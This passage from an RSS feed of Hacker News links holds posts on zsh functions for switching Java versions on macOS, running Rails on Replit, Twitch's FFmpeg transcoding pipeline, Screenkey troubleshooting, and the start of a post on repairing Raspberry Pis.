<li>I want the ability to switch, locally, between versions when needed</li>
<li>Bonus: automatically switching version when entering a folder would be cool</li>
</ul>
<p>.. and I believe that’s about it. New versions can easily be downloaded with Homebrew. Changing the version globally would be nice, but is not strictly neccesary.</p>
<p>Now, macOS comes with a little known commandline tool called <code>java_home</code>. It is located at <code>/usr/libexec/java_home</code>, which is not on your <code>PATH</code> by default, so I guess it might be hard to find. Anyway, it knows Java. It knows your default version. It knows the other installed versions. But most importantly for us, you can hand it different filters and get a path to a valid Java home folder back.</p>
<p>Our solution is based around the <code>java_home</code> tool. Let’s see it!</p>
<h2 id="a-solution">A solution</h2>
<p>I keep this in my <code>.zshrc</code> file. I have <em>no</em> idea if this will work in Bash or some other shell – it’s untested in everything but Zsh. Sorry 🤷.</p>
<pre><code><span># Extract version from release file in java folder
</span><span>_java_version</span><span>() {
    </span><span>local </span><span>version_path</span><span>=$</span><span>1
    </span><span>if </span><span>[[ </span><span>-</span><span>f </span><span>$</span><span>version_path</span><span>/release ]]</span><span>; </span><span>then
        </span><span>cat </span><span>$</span><span>version_path</span><span>/release </span><span>| </span><span>grep </span><span>"</span><span>JAVA_VERSION=</span><span>" | </span><span>sed</span><span> -</span><span>E </span><span>'</span><span>s/JAVA_VERSION=|\"//g</span><span>'
    </span><span>else
        </span><span>echo </span><span>$</span><span>path
    </span><span>fi
</span><span>}

</span><span># List current version with "jdk", or change with "jdk 12"
</span><span>jdk</span><span>() {
    </span><span>local </span><span>version</span><span>=${</span><span>1</span><span>:-""}
    </span><span>local </span><span>silent</span><span>=${</span><span>2</span><span>:-</span><span>false</span><span>}
    </span><span>if </span><span>[[ </span><span>$</span><span>version </span><span>= "" </span><span>]]</span><span>; </span><span>then
        </span><span>java</span><span> -</span><span>version
    </span><span>else
        </span><span>export </span><span>JAVA_HOME</span><span>=$(</span><span>/usr/libexec/java_home</span><span> -</span><span>v</span><span>"$</span><span>version</span><span>");
        </span><span>if </span><span>[[ </span><span>$</span><span>silent </span><span>=</span><span> false ]]</span><span>; </span><span>then
            </span><span>java</span><span> -</span><span>version
        </span><span>fi
    fi
</span><span>}

</span><span># List available versions, global version, and local version with "jdks"
</span><span>jdks</span><span>() {
    </span><span>echo </span><span>"</span><span>Java versions</span><span>"
    </span><span>/usr/libexec/java_home</span><span> -</span><span>V 2</span><span>&gt;&amp;</span><span>1 </span><span>| </span><span>sed 1d </span><span>| </span><span>sed </span><span>'</span><span>$d</span><span>' | </span><span>cut</span><span> -</span><span>d</span><span>,</span><span> -</span><span>f1
    </span><span>echo </span><span>"</span><span>Global: </span><span>$(</span><span>_java_version </span><span>$(</span><span>/usr/libexec/java_home</span><span>))"
    </span><span>if </span><span>[[ </span><span>! -</span><span>z </span><span>$</span><span>JAVA_HOME </span><span>]]</span><span>; </span><span>then
        </span><span>echo </span><span>"</span><span>Local:  </span><span>$(</span><span>_java_version </span><span>$</span><span>JAVA_HOME</span><span>)"
    </span><span>fi
</span><span>}
</span></code></pre>
<p>The usage is mostly there as a comment above each function, but to explain the workflow: list available versions on the system, along with current global and possibly local version with the command <code>jdks</code>. No arguments needed here. To list the active version in your current shell, use the command <code>jdk</code>. Use this last command together with a version number to change version locally: <code>jdk 1.8</code>&nbsp;gives you Java 1.8, <code>jdk 12</code> gives you Java 12. You don’t need to be completely specific, <code>jdk 1.8</code> chooses 1.8.0_265 on my system, even though 1.8.0_151 is installed as well. I’m not fluid on the heuristics here, but it mostly seems to behave.</p>
<h2 id="bonus">Bonus</h2>
<p>One thing I have added later on is loading a Java version from a <code>.java-version</code> file. With the snippet below, if I visit a folder with a <code>.java-version</code>&nbsp;file in it, the version is automatically changed. Could it be any easier? Yeah, I guess – it could check recursively, but I haven’t bothered yet. That sounds like it could also slow down my shell as it would happen on every directory change, so there might be a trade off here. As of now, this fills my needs.</p>
<pre><code><span># Put this in your .zshrc file as well

# Automatically change java version from .java-version file
</span><span>autoload</span><span> -</span><span>U</span><span> add-zsh-hook
_jdk_autoload_hook</span><span>() {
    </span><span>if </span><span>[[ </span><span>-</span><span>f</span><span> .java-version ]]</span><span>; </span><span>then
        </span><span>jdk </span><span>"$(</span><span>cat .java-version</span><span>)"</span><span> true
    </span><span>fi
</span><span>}

</span><span>add-zsh-hook chpwd _jdk_autoload_hook
</span></code></pre>
</section>

    </article></div>]]>
            </description>
            <link>https://www.bendik.dev/posts/java-version-management-on-macos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25972845</guid>
            <pubDate>Sat, 30 Jan 2021 20:47:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rails in 30 Seconds]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25972355">thread link</a>) | @amasad
<br/>
January 30, 2021 | https://blog.replit.com/rails | <a href="https://web.archive.org/web/*/https://blog.replit.com/rails">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Philosophically, Replit and Rails are incredibly aligned. We both exist to remove excessive configuration and complexity that stands in the way of building things. However, for a long time, it bothered me that Replit didn't work well with Rails because we focus on small and lightweight projects. Recently, our infrastructure has gotten much more powerful, and I decided to give Rails another spin. It turns out it's not only possible to do Rails on Replit; it's quite a delightful experience. It takes less than 30 seconds from starting a project to seeing the welcome screen:</p>

<p>There is no magic under the hood. You can view the <a href="https://repl.it/@templates/Rails">template here</a>. I merely followed the getting started guide on the rails site and had to do only a couple of modifications to make the development website show up in the iframe on Replit (detailed in the readme file).</p>
<p>Give it a spin, and let me know what you think!</p>

	</div></div>]]>
            </description>
            <link>https://blog.replit.com/rails</link>
            <guid isPermaLink="false">hacker-news-small-sites-25972355</guid>
            <pubDate>Sat, 30 Jan 2021 19:53:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Twitch Live Video Transmuxing/Transcoding (2017)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25972163">thread link</a>) | @kuter
<br/>
January 30, 2021 | https://blog.twitch.tv/en/2017/10/10/live-video-transmuxing-transcoding-f-fmpeg-vs-twitch-transcoder-part-i-489c1c125f28/ | <a href="https://web.archive.org/web/*/https://blog.twitch.tv/en/2017/10/10/live-video-transmuxing-transcoding-f-fmpeg-vs-twitch-transcoder-part-i-489c1c125f28/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-proofer-ignore="">
    <p>By: <strong>Jeff Gong</strong>, Software Engineer, <a href="mailto:jeffgon@twitch.tv">jeffgon@twitch.tv</a>
<strong>Sahil Dhanju</strong>, Software Engineer Intern
<strong>Chih-Chiang Lu</strong>, Senior Software Engineer, <a href="mailto:chihchil@twitch.tv">chihchil@twitch.tv</a>
<strong>Yueshi Shen</strong>, Principal Research Engineer, <a href="mailto:yshen@twitch.tv">yshen@twitch.tv</a></p>

<p>Special thanks go to
<strong>Christopher Kennedy</strong>, Staff Video Engineer at Crunchyroll/Ellation
<strong>John Nichols</strong>, Principal Software Engineer at Xilinx, <a href="mailto:jnichol@xilinx.com">jnichol@xilinx.com</a> for their information on FFmpeg and reviewing this article.</p>

<p>Note: This is the first part of a 2-part series. Please <a href="https://blog.twitch.tv/live-video-transmuxing-transcoding-ffmpeg-vs-twitchtranscoder-part-ii-4973f475f8a3">read part 2</a> after finishing this article.</p>

<p><strong>Background</strong></p>

<p>Twitch is the world’s leading live streaming platform for video games, esports, and other emerging creative content. Every month, more than 2.2 million unique content creators stream or upload video on our website. At its peak, Twitch ingests tens of thousands of concurrent live video streams and delivers them to viewers across the world.</p>

<p>Figure 1 depicts the architecture of our live video Content Delivery Network (CDN) which delivers tens of thousands of concurrent live streams internationally.</p>

<p><img src="https://blog.twitch.tv/assets/uploads/9406390810b8b00cd754d7d2332cfabb.png" alt=""></p>

<p>Twitch, like many other live streaming services, receives live stream uploads in Real-Time Messaging Protocol (<a href="https://en.wikipedia.org/wiki/Real-Time_Messaging_Protocol">RTMP</a>) from its broadcasters. RTMP is a protocol designed to stream video and audio on the Internet, and is mainly used for point to point communication. To then scale our live stream content to countless viewers, Twitch uses HTTP Live Streaming (<a href="https://en.wikipedia.org/wiki/HTTP_Live_Streaming">HLS</a>), an HTTP-based media streaming communications protocol that most video websites also use.</p>

<p>Within the live stream processing pipeline, the transcoder module is in charge of converting an incoming RTMP stream into the HLS format with multiple variants (e.g., 1080p, 720p, etc.). These variants have different bitrates so that viewers with different levels of download bandwidth are able to consume live video streams at the best possible quality for their connection.</p>

<p>Figure 2 depicts the input and output of the transcoder module in our live video CDN.</p>

<p><img src="https://blog.twitch.tv/assets/uploads/721496d4059040ba985be574e9afc577.png" alt=""></p>

<p>In this article, we will discuss</p>

<ul>
  <li>
    <p>how FFmpeg satisfies most of the live transcoding requirements,</p>
  </li>
  <li>
    <p>what features FFmpeg doesn’t provide, and</p>
  </li>
  <li>
    <p>why Twitch builds its own in-house transcoder software stack.</p>
  </li>
</ul>

<p><strong>Using FFmpeg Directly</strong></p>

<p>FFmpeg (<a href="https://www.ffmpeg.org/">https://www.ffmpeg.org/</a>) is a popular open-source software project, designed to record, process and stream video and audio. It is widely deployed by cloud encoding services for file <a href="https://en.wikipedia.org/wiki/Transcoding">transcoding</a> and can also be used for live stream <a href="https://en.wikipedia.org/wiki/Transmux">transmuxing</a> and transcoding.</p>

<p>Suppose we are receiving the most widely used video compression standard of <a href="https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC">H.264</a> in RTMP at 6mbps and 1080p60 (resolution of 1920 by 1080 with a frame rate of 60 frames per second). We want to generate 4 HLS variants of:</p>

<ul>
  <li>
    <p>1080p60 HLS/H.264,</p>
  </li>
  <li>
    <p>720p60 HLS/H.264,</p>
  </li>
  <li>
    <p>720p30 HLS/H.264</p>
  </li>
  <li>
    <p>480p30 HLS/H.264</p>
  </li>
</ul>

<p>One solution is to run 4 independent instances of FFmpeg, each of them processing one variant. Here we set all of their Instantaneous Decoding Refresh (<a href="https://en.wikipedia.org/wiki/Network_Abstraction_Layer">IDR</a>) intervals to 2 seconds and turn off the scene change detection, thus allowing the output HLS segments of all variants are perfectly time aligned, which is required by the HLS standard.</p>

<p><em>FFmpeg 1-in-1-out Sample Commands:</em></p>

<p>_ffmpeg -i  -c:v libx264 -x264opts keyint=<idr interval="">:no-scenecut -s <resolution> -r <fps> -b:v <target bitrate=""> -profile:v <profile> -c:a aac -sws_flags <scaler algorithm=""> -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8_</output></number></scaler></profile></target></fps></resolution></idr></p>

<p><em>Notes:</em></p>

<ul>
  <li>
    <p><em>All parameters surrounded by ‘&lt;&gt;’ require inputs from the user. Some of these are described in greater detail below</em></p>
  </li>
  <li>
    <p><strong>c:v</strong> specifies the video codec to use, in our case, libx264</p>
  </li>
  <li>
    <p><strong>x264opts</strong> specifies libx264 specific options. Here, <strong>IDR interval</strong> should be 2 * your desired FPS, so 720p60 would yield an IDR interval of 120 while 720p30 would require an IDR interval of 60. No-scenecut is used to disable scene change detection</p>
  </li>
  <li>
    <p><strong>s</strong> specifies video size which can be in the form of “width x height” or the name of a size abbreviation</p>
  </li>
  <li>
    <p><strong>r</strong> specifies the FPS</p>
  </li>
  <li>
    <p><strong>b:v</strong> specifies a target video bitrate, which is most useful for streaming when there are bandwidth targets and requirements; there is a companion <strong>b:a</strong> for audio</p>
  </li>
  <li>
    <p><strong>profile</strong> refers to <a href="https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC#Profiles">H.264 profile</a></p>
  </li>
  <li>
    <p><strong>sws_flags</strong> determines what scaling algorithm should be used</p>
  </li>
  <li>
    <p><strong>hls_list_size</strong> is used to determine the maximum number of segments in the playlist (e.g., we can use 6 for live streaming or set it equal to 0 to have a playlist of all the segments). The segment duration (the optional <strong>hls_time</strong> flag) will be same as the IDR interval, in our case is 2 seconds.</p>
  </li>
</ul>

<p>Since H.264 is a lossy compression standard, transcoding will inevitably trigger video quality degradation. Moreover, encoding is a very computationally expensive process, particularly for high resolution and high frame rate video. Due to these two constraints, we would ideally like to transmux rather than transcode the highest variant from the source RTMP to save the computational power and preserve the video quality.</p>

<p>In the above example, if we want to transmux an input 1080p60 RTMP source to HLS, we can actually use the above commands without specifying a size or target FPS and specifying <em>copy</em> for the codecs (to avoid decoding and re-encoding the source):</p>

<p>_ffmpeg -i  -c:v copy -c:a copy -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8_</output></number></p>

<p>Transmuxing the source bitstream is an effective technique, but might cause output HLS to lose its spec compliancy, causing it to be unplayable on certain devices. We will explain the nature of the problem and its ramifications in the next section.</p>

<p>On the other hand, FFmpeg does have the functionality of taking in <em>1</em> input and producing <em>N</em> outputs, which we demonstrate with the following FFmpeg command.</p>

<p><em>FFmpeg 1-in-N-out Sample Commands (use Main Profile, x264 veryfast preset, and the bilinear scaling algorithm):</em></p>

<p>_ffmpeg -i  _</p>

<p>_-c:v libx264 -x264opts keyint=120:no-scenecut -s 1920x1080 -r 60 -b:v <target bitrate=""> -profile:v main -preset veryfast -c:a libfdk_aac -sws_flags bilinear -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8 \_</output></number></target></p>

<p>_-c:v libx264 -x264opts keyint=120:no-scenecut -s 1280x720 -r 60 -b:v <target bitrate=""> -profile:v main -preset veryfast -c:a libfdk_aac -sws_flags bilinear -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8 \_</output></number></target></p>

<p>_-c:v libx264 -x264opts keyint=60:no-scenecut -s 1280x720 -r 30 -b:v <target bitrate=""> -profile:v main -preset veryfast -c:a libfdk_aac -sws_flags bilinear -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8 \_</output></number></target></p>

<p>_-c:v libx264 -x264opts keyint=60:no-scenecut -s 852x480 -r 30 -b:v <target bitrate=""> -profile:v main -preset veryfast -c:a libfdk_aac -sws_flags bilinear -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8_</output></number></target></p>

<p>If we wanted to transmux instead of transcode the highest variant while transcoding the rest of the variants, we can replace the the first output configuration with the previously specified copy codec:</p>

<p>_-c:v copy -c:a copy -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8_</output></number></p>

<p><em>Notes</em><strong>:</strong></p>

<ul>
  <li>
    <p><em>From the above command, we are transcoding multiple variants out of a single input file. Each “\” denotes a new line, in which we can specify a different combination of flags as well as a unique output name. Each command is independent of the other and can use any other combination of flags.</em></p>
  </li>
  <li>
    <p>The p<strong>r</strong>imary difference<strong>s</strong> for each command here can be seen in the s and r flags which are explained earlier in the article.</p>
  </li>
  <li>
    <p><em>An alternative to running the following transcodes in a single FFmpeg instance is to run multiple instances, one for each desired output in parallel. The 1-in-N-out FFmpeg is a computationally cheaper process, whose reason we will explain next.</em></p>
  </li>
</ul>

<p><strong>A Few Technical Issues</strong></p>

<p>The previous section demonstrated how FFmpeg can be used to generate HLS for live streams. While useful, a few technical issues make FFmpeg a less-than-ideal solution.</p>

<p><em>Transmux and Transcode</em></p>

<p><img src="https://blog.twitch.tv/assets/uploads/21f280d3eaf85ca46e6d0c7ba626bdf7.png" alt=""></p>

<p>In HLS, a variant is comprised of a series of segments, each starting with an IDR frame. The HLS spec requires that IDR frames of a variants’ corresponding segments be aligned, such that they will have the same Presentation Timestamp (<a href="https://en.wikipedia.org/wiki/Presentation_timestamp">PTS</a>). Only in this way can an HLS Adaptive Bitrate (<a href="https://en.wikipedia.org/wiki/Adaptive_bitrate_streaming">ABR</a>) player seamlessly switch among the variants when the viewer’s network condition changes (see Figure 3).</p>

<p><img src="https://blog.twitch.tv/assets/uploads/85a60492f18f8ddc521ac7bf3ae7794f.png" alt=""></p>

<p>If we transcode both the source and the rest of the variants, we will get perfectly time-aligned HLS segments since we force the FFmpeg to encode IDRs precisely every 2 seconds. However, we don’t have control over the IDR intervals in the source RTMP bitstream, which is completely determined by the broadcast software’s configuration. If we transmux the source, the segments of the transmuxed and transcoded variants are not guaranteed to align (see Figure 4). This misalignment can cause playback issues. For example, we have noticed that <a href="https://en.wikipedia.org/wiki/Chromecast">Chromecast</a> constantly exhibits playback pauses when it receives HLS streams with misaligned segments.</p>

<p>For the source RTMP stream with variable IDR intervals, we ideally want the output HLS to look aligned like in Figure 5:</p>

<p><img src="https://blog.twitch.tv/assets/uploads/221d1a11939482fecb69acb0f33104a7.png" alt=""></p>

<p>However, in both the <strong>1<em>-in-1-out</em> and the 1-in-</strong><em>N</em>__-out FFmpeg instances, the N encoders associated with the N output variants are independent. As explained above, the result IDRs will not be aligned (see Figure 4) unless all variants are transcoded (i.e. the highest variant is also transcoded not transmuxed from the source).</p>

<p><em>Software Performance</em></p>

<p>As discussed in Figure 2, our RTMP-HLS transcoder takes in an input of <strong>1</strong> stream and produces an output of <strong>__<em>N</em></strong>__ streams (N = the number of HLS variants. E.g., N = 4 in Figure 5). The simplest way to achieve this output is to create N independent <em>1-in-1-out</em> transcoders, with each generating 1 output stream. The FFmpeg solution described above utilizes this model and has N FFmpeg instances.</p>

<p>There are 3 components within a <em>1-in-1-out</em> transcoder, namely <a href="https://en.wikipedia.org/wiki/Video_decoder">decoder</a>, <a href="https://en.wikipedia.org/wiki/Video_scaler">scaler</a>, and <a href="https://en.wikipedia.org/wiki/Video_decoder">encoder</a> (see Figure 6). Therefore, for <strong>__N</strong>__ FFmpeg instances, we will have N decoders, N scalers, and N encoders altogether.</p>

<p><img src="https://blog.twitch.tv/assets/uploads/fafdd4efb43d05e6faa42f9e3fa091c2.png" alt=""></p>

<p>Since the <strong>N</strong> decoders are identical, the transcoder should ideally eliminate the redundant <em>N-1</em> decoders and feed decoded images from the only decoder to the N downstream scalers and encoders (see Figure 7).</p>

<p><img src="https://blog.twitch.tv/assets/uploads/862300f4e9c083ca89a1f98f9a494e37.png" alt=""></p>

<p>We talked about the decoder redundancy above. Now, let’s take another look at the four-variant …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.twitch.tv/en/2017/10/10/live-video-transmuxing-transcoding-f-fmpeg-vs-twitch-transcoder-part-i-489c1c125f28/">https://blog.twitch.tv/en/2017/10/10/live-video-transmuxing-transcoding-f-fmpeg-vs-twitch-transcoder-part-i-489c1c125f28/</a></em></p>]]>
            </description>
            <link>https://blog.twitch.tv/en/2017/10/10/live-video-transmuxing-transcoding-f-fmpeg-vs-twitch-transcoder-part-i-489c1c125f28/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25972163</guid>
            <pubDate>Sat, 30 Jan 2021 19:33:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Screenkey – Screencast Your Keys]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25972131">thread link</a>) | @app4soft
<br/>
January 30, 2021 | https://www.thregr.org/~wavexx/software/screenkey/ | <a href="https://web.archive.org/web/*/https://www.thregr.org/~wavexx/software/screenkey/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="initialization-failure">
<h2><a href="#id16">Initialization&nbsp;failure</a></h2>
<p>Screenkey is very sensitive to improperly configured input methods or
keyboard settings. Installing, removing or “playing around” with some
packages such as <tt><span>im-config</span></tt>, <tt>ibus</tt>, <tt>fcitx</tt> or <tt>scim</tt> might
leave the current settings in a half-broken state. Some distributions
are also known to have broken settings by <em>default</em>.</p>
<p>In short: the various environment flags (<tt>XMODIFIERS</tt>,
<tt>GTK_IM_MODULE</tt>, <tt>QT_IM_MODULE</tt> to name a few) need to be
<em>consistent</em>. They either should be all unset, or all set to the <em>same</em>
input method. When using <tt>ibus</tt>, <tt>fcitx</tt> or other complex methods,
the corresponding daemon <em>must</em> be&nbsp;running.</p>
<p>An “input method” is the mechanism which handles the task of
transforming key presses into characters. Latin languages mostly use a
straightforward key -&gt; character mechanism, but other languages don’t
have a key for each possible character and thus need extra logic.
Programs need to be told <em>which</em> input method to use, and this is
usually done through environment variables. There is one environment
variable for each graphical toolkit and it’s set at the start of the
session, usually by a command in the <tt><span>~/.profile</span></tt> file. Screenkey can
only record a program correctly if it’s using the <em>same</em> input method as
the&nbsp;target.</p>
<p>To check the status of the environment, run the following inside a&nbsp;terminal:</p>
<pre>echo XMODIFIERS=$XMODIFIERS
echo GTK_IM_MODULE=$GTK_IM_MODULE
echo QT_IM_MODULE=$QT_IM_MODULE
</pre>
<p>On a system with a Latin language and without any complex input method
running you should see everything&nbsp;empty:</p>
<pre>XMODIFIERS=
GTK_IM_MODULE=
QT_IM_MODULE=
</pre>
<p>On a system running “ibus” you should&nbsp;see:</p>
<pre>XMODIFIERS=@im=ibus
GTK_IM_MODULE=ibus
QT_IM_MODULE=ibus
</pre>
<p>Additionally, the ibus package must be installed and the ibus daemon
should be running. Check the output&nbsp;of:</p>
<pre>$ pgrep -ax ibus-daemon
982 /usr/bin/ibus-daemon --xim
</pre>
<p><tt><span>ibus-daemon</span></tt> should be present and <em>must</em> include <tt><span>--xim</span></tt> in the
command line. If not, the daemon must be restarted with it! Consult the
documentation of your distribution for more&nbsp;information.</p>
<p>On a system using “fcitx” the following output has to be&nbsp;expected:</p>
<pre>XMODIFIERS=@im=fcitx
GTK_IM_MODULE=fcitx
QT_IM_MODULE=fcitx
</pre>
<p>In this case <tt>fcitx</tt> daemon should be running as&nbsp;well:</p>
<pre>$ pgrep -ax fcitx
1053 /usr/bin/fcitx
</pre>
<p>If you see <em>any</em> mixture of the above, your system is likely to be
incorrectly&nbsp;configured.</p>
<p>If the “ibus” or “fcitx” packages are not installed, there are no
daemons running and the variables are mostly empty, then try simply
unsetting all of them before running Screenkey in a&nbsp;terminal:</p>
<pre>unset XMODIFIERS
unset GTK_IM_MODULES
unset QT_IM_MODULES
screenkey
</pre>
<p>If screenkey runs correctly after these changes, check your startup
files such as <tt><span>~/.profile</span></tt>, <tt><span>~/.bash_profile</span></tt> or
<tt><span>~/.pam_environment</span></tt> and remove the offending variables to make the
change permanent. You must log-out and log-in in order to be able to run
Screenkey normally after the&nbsp;change.</p>
<p>If you’re running either <tt>ibus</tt> or <tt>fcitx</tt> but the variables contain
mixed values, try to reset them manually&nbsp;using:</p>
<pre>export XMODIFIERS=@im=ibus
export GTK_IM_MODULE=ibus
export QT_IM_MODULE=ibus
screenkey
</pre>
<p>Again, if Screenkey works correctly after the change, inspect the
contents of your startup files as above to make the change&nbsp;permanent.</p>
<p>You should always check the documentation of your distribution to see
which input method <em>should</em> be running and how it should be configured.
The above guide is not meant to be exhaustive. If nothing works, get in
touch with the authors or file an issue on Gitlab to get more&nbsp;help.</p>
</div><div id="cannot-stop-screenkey-or-no-status-icon">
<h2><a href="#id17">Cannot stop Screenkey or no status&nbsp;icon</a></h2>
<p>You can exit from Screenkey by right-clicking on it’s status icon and
selecting&nbsp;“Quit”.</p>
<p>If you’re using <span>GNOME</span>/Unity and cannot see any status icon please make
sure the <tt><span>gir1.2-appindicator3-0.1</span></tt> package is installed. Run the
following inside a terminal to install as&nbsp;required:</p>
<pre>sudo apt-get install gir1.2-appindicator3-0.1
</pre>
<p>On any other desktop system Screenkey uses the regular system tray. If
you don’t have a systray or you cannot quit an existing Screenkey, use
the following command in a terminal to kill&nbsp;it:</p>
<pre>pkill -f screenkey
</pre>
<p>The proper way to exit when running Screenkey from a terminal is simply
by interrupting it with <tt>Ctrl+C</tt>.</p>
</div><div id="no-output-in-gnome-terminal">
<h2><a href="#id18">No output in <span>GNOME</span>&nbsp;Terminal</a></h2>
<p>Screenkey cannot currently capture any input directed to native Wayland
programs such as the <span>GNOME</span> Terminal: only X11 programs are&nbsp;supported.</p>
<p>If you need to record a terminal session you’ll have to switch to
another X11 terminal emulator such as xterm, urxvt, mlterm,&nbsp;…</p>
</div></div>]]>
            </description>
            <link>https://www.thregr.org/~wavexx/software/screenkey/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25972131</guid>
            <pubDate>Sat, 30 Jan 2021 19:30:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fixing 200 broken raspberry Pis to prevent e-waste and donating the money raised]]>
            </title>
            <description>
<![CDATA[
Score 79 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25972094">thread link</a>) | @technlogger
<br/>
January 30, 2021 | https://blog.jmdawson.co.uk/i-bought-200-raspberry-pi-model-bs-and-im-going-to-fix-them-part-4/ | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/i-bought-200-raspberry-pi-model-bs-and-im-going-to-fix-them-part-4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3651">

	

	<div>
		
<h2>Introduction</h2>



<div><p>The first batch of the repaired Raspberry Pi’s have been sold! If you missed out on this, don’t worry! There are more to come as I repair them. </p><p>I sold a total of 27 Raspberry Pi’s, 3 people cancelled their orders as they somehow thought these were Raspberry Pi 4’s?! I will relist these  during the week along with a few freshly repaired devices with upgraded SD card slots.</p></div>



<p>After ebay fees and P&amp;P the total was £400 which I have donated to the Raspberry Pi Foundation as can be seen below, more will be coming in a future post to show what this money will go towards. </p>



<figure><img data-attachment-id="3653" data-permalink="https://blog.jmdawson.co.uk/i-bought-200-raspberry-pi-model-bs-and-im-going-to-fix-them-part-4/image-9/" data-orig-file="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?fit=1128%2C1062&amp;ssl=1" data-orig-size="1128,1062" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-9" data-image-description="" data-medium-file="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?fit=300%2C282&amp;ssl=1" data-large-file="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?fit=750%2C706&amp;ssl=1" loading="lazy" width="750" height="706" src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?resize=750%2C706&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?resize=750%2C706&amp;ssl=1" alt="" data-srcset="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?resize=1024%2C964&amp;ssl=1 1024w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?resize=300%2C282&amp;ssl=1 300w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?resize=768%2C723&amp;ssl=1 768w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?w=1128&amp;ssl=1 1128w" data-sizes="(max-width: 750px) 100vw, 750px" data-recalc-dims="1" data-old-src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?resize=750%2C706&amp;ssl=1" data-lazy-srcset="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?resize=1024%2C964&amp;ssl=1 1024w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?resize=300%2C282&amp;ssl=1 300w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?resize=768%2C723&amp;ssl=1 768w, https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?w=1128&amp;ssl=1 1128w" data-lazy-src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/image-9.png?resize=750%2C706&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Donation to the Raspberry Pi foundation</figcaption></figure>



<h2>Replacing and Upgrading Damaged SD Card Slots</h2>



<p>A large amount of the Pi’s had damaged SD card slots, the original slots are made of plastic which was fairly brittle in 2012 when they were released and they really haven’t aged well! </p>



<figure><img data-attachment-id="3649" data-permalink="https://blog.jmdawson.co.uk/img_1561/" data-orig-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?fit=1920%2C2560&amp;ssl=1" data-orig-size="1920,2560" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 8 Plus&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1612006255&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.99&quot;,&quot;iso&quot;:&quot;80&quot;,&quot;shutter_speed&quot;:&quot;0.16666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1561" data-image-description="" data-medium-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?fit=225%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?fit=750%2C1000&amp;ssl=1" loading="lazy" width="750" height="1000" 